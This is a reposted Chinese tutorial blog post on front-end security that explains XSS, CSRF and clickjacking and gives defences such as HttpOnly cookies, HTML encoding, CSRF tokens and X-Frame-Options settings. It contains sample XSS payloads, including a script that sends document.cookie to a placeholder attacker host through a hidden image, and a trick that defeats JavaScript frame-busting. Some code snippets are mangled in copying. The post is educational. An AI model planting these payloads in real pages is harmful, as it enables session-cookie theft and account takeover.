---
title: 【转载】关于XSS攻击和CSRF攻击
description: '-'
tags:
  - WEB开发
  - Web安全
abbrlink: '70e37285'
date: 2021-03-28 18:28:16
---



## 前端安全知识—关于XSS攻击和CSRF攻击

[珠峰培训](javascript:void(0);) *2019-04-05*



> 原文链接：https://mp.weixin.qq.com/s/zDaksmeNKbv75al_jz1ZOg



**XSS**



xss: 跨站脚本攻击（Cross Site Scripting）是最常见和基本的攻击 WEB 网站方法，攻击者通过注入非法的 html 标签或者 javascript 代码，从而当用户浏览该网页时，控制用户浏览器。



**xss 主要分为三类：**



**DOM xss :**



DOM即文本对象模型，DOM通常代表在html、xhtml和xml中的对象，使用DOM可以允许程序和脚本动态的访问和更新文档的内容、结构和样式。它不需要服务器解析响应的直接参与，触发XSS靠的是浏览器端的DOM解析，可以认为完全是客户端的事情。



**反射型 xss :**



反射型XSS也被称为非持久性XSS，是现在最容易出现的一种XSS漏洞。发出请求时，XSS代码出现在URL中，最后输入提交到服务器，服务器解析后在响应内容中出现这段XSS代码，最后浏览器解析执行。



**存储型 xss :**



存储型XSS又被称为持久性XSS，它是最危险的一种跨站脚本，相比反射型XSS和DOM型XSS具有更高的隐蔽性，所以危害更大，因为它不需要用户手动触发。 允许用户存储数据的web程序都可能存在存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当所有浏览者访问某个页面时都会被XSS，其中最典型的例子就是留言板。



**跨站脚本攻击可能造成以下影响：**



- 利用虚假输入表单骗取用户个人信息。

  

- 利用脚本窃取用户的 Cookie 值，被害者在不知情的情况下，帮助攻击者发送恶意请求。

  

- 显示伪造的文章或图片。



**存储型 xss 案例**



在项目开发中，评论是个常见的功能，如果直接把评论的内容保存到数据库，那么显示的时候就可能被攻击。



如果你只是想试试 xss，可以这样：



```
<fontsize="100"color="red">试试水font>
```



![图片](http://blog.cdn.ionluo.cn/blog/640.webp)

如果带点恶意，可以这样：



```
<script>while (true) {          alert('Hello')      }script>
```



这时，网站就挂了。



当然，最常见 xss 攻击是读取 Cookie：



```
<script>      alert(document.cookie)script>
```



![图片](http://blog.cdn.ionluo.cn/blog/640-1609826225616.webp)

Cookie 发送给攻击者的站点：



```
var img =document.createElement('img')  img.src='http://www.xss.com?cookie=' +document.cookie  img.style.display='none'document.getElementsByTagName('body')[0].appendChild(img)
```



当前用户的登录凭证存储于服务器的 session 中，而在浏览器中是以 cookie 的形式存储的。如果攻击者能获取到用户登录凭证的 Cookie，甚至可以绕开登录流程，直接设置这个 Cookie 值，来访问用户的账号。



**防御**



按理说，只要有输入数据的地方，就可能存在 XSS 危险。



httpOnly: 在 cookie 中设置 HttpOnly 属性后，js脚本将无法读取到 cookie 信息。



```
// koa  ctx.cookies.set(name,value, {      httpOnly:true// 默认为 true  })  `
```



**过滤**



输入检查，一般是用于对于输入格式的检查，例如：邮箱，电话号码，用户名，密码……等，按照规定的格式输入。



不仅仅是前端负责，后端也要做相同的过滤检查。

因为攻击者完全可以绕过正常的输入流程，直接利用相关接口向服务器发送设置。



HtmlEncode某些情况下，不能对用户数据进行严格过滤，需要对标签进行转换



![图片](http://blog.cdn.ionluo.cn/blog/640-1609826225606.webp)

当用户输入, 最终保存结果为

<script>window.location.href="http://www.baidu.com"</script>, 在展现时，浏览器会对这些字符转换成文本内容，而不是一段可以执行的代码。



JavaScriptEncode对下列字符加上反斜杠

![图片](http://blog.cdn.ionluo.cn/blog/640.webp)

**CSRF**



csrf：跨站点请求伪造（Cross-Site Request Forgeries），也被称为 one-click attack 或者 session riding。冒充用户发起请求（在用户不知情的情况下）， 完成一些违背用户意愿的事情（如修改用户信息，删初评论等）。



**可能会造成以下影响：**



- 利用已通过认证的用户权限更新设定信息等；
- 利用已通过认证的用户权限购买商品；
- 利用已通过的用户权限在留言板上发表言论。



一张图了解原理：



![图片](http://blog.cdn.ionluo.cn/blog/640-1609826225552.webp)



简而言之：网站过分相信用户。



**与 xss 区别**



通常来说 CSRF 是由 XSS 实现的，CSRF 时常也被称为 XSRF（CSRF 实现的方式还可以是直接通过命令行发起请求等）。



本质上讲，XSS 是代码注入问题，CSRF 是 HTTP 问题。XSS 是内容没有过滤导致浏览器将攻击者的输入当代码执行。CSRF 则是因为浏览器在发送 HTTP 请求时候自动带上 cookie，而一般网站的 session 都存在 cookie里面。



来自某乎的一个栗子：



![图片](http://blog.cdn.ionluo.cn/blog/640-1609826225574.webp)



**防御**



- 验证码；强制用户必须与应用进行交互，才能完成最终请求。此种方式能很好的遏制 csrf，但是用户体验比较差。

  

- 尽量使用 post ，限制 get 使用；上一个例子可见，get 太容易被拿来做 csrf 攻击，但是 post 也并不是万无一失，攻击者只需要构造一个form就可以。

  

- Referer check；请求来源限制，此种方法成本最低，但是并不能保证 100% 有效，因为服务器并不是什么时候都能取到 Referer，而且低版本的浏览器存在伪造 Referer 的风险。

  

- token；token 验证的 CSRF 防御机制是公认最合适的方案。



整体思路如下：



第一步：后端随机产生一个 token，把这个token 保存到 session 状态中；同时后端把这个token 交给前端页面；



第二步：前端页面提交请求时，把 token 加入到请求数据或者头信息中，一起传给后端；



后端验证前端传来的 token 与 session 是否一致，一致则合法，否则是非法请求。



若网站同时存在 XSS 漏洞的时候，这个方法也是空谈。



**Clickjacking**



Clickjacking： 点击劫持，是指利用透明的按钮或连接做成陷阱，覆盖在 Web 页面之上。然后诱使用户在不知情的情况下，点击那个连接访问内容的一种攻击手段。这种行为又称为界面伪装(UI Redressing) 。



大概有两种方式：



- 攻击者使用一个透明 iframe，覆盖在一个网页上，然后诱使用户在该页面上进行操作，此时用户将在不知情的情况下点击透明的 iframe 页面；
- 攻击者使用一张图片覆盖在网页，遮挡网页原有的位置含义。



**案例**



一张图了解

![图片](http://blog.cdn.ionluo.cn/blog/640-1609826225556.webp)

一般步骤



- 黑客创建一个网页利用 iframe 包含目标网站；
- 隐藏目标网站，使用户无法无法察觉到目标网站存在；
- 构造网页，诱变用户点击特点按钮
- 用户在不知情的情况下点击按钮，触发执行恶意网页的命令。



**防御**



X-FRAME-OPTIONS；

X-FRAME-OPTIONS HTTP 响应头是用来给浏览器指示允许一个页面可否在<frame>, <iframe> 或者 <object> 中展现的标记。网站可以使用此功能，来确保自己网站内容没有被嵌到别人的网站中去，也从而避免点击劫持的攻击。



有三个值：



DENY：表示页面不允许在 frame 中展示，即便是在相同域名的页面中嵌套也不允许。

SAMEORIGIN：表示该页面可以在相同域名页面的 frame 中展示。

ALLOW-FROM url：表示该页面可以在指定来源的 frame 中展示。



**配置 X-FRAME-OPTIONS：**



Apache 

把下面这行添加到 'site' 的配置中：



```
Header always append X-Frame-Options SAMEORIGIN
```





nginx



把下面这行添加到 'http', 'server' 或者 'location'，配置中



```
add_header X-Frame-Options SAMEORIGIN;
```



IIS



添加下面配置到 Web.config 文件中



```
  <system.webServer>...<httpProtocol>  <customHeaders>    <add name="X-Frame-Options" value="SAMEORIGIN" />  </customHeaders></httpProtocol>...</system.webServer>
```



js 判断顶层窗口跳转，可轻易破解，意义不大；



```
function locationTop(){  if (top.location != self.location) {     top.location = self.location; return false;  }  return true;  }locationTop();
```



```
// 破解：// 顶层窗口中放入代码var location = document.location;//或者var location = "";
```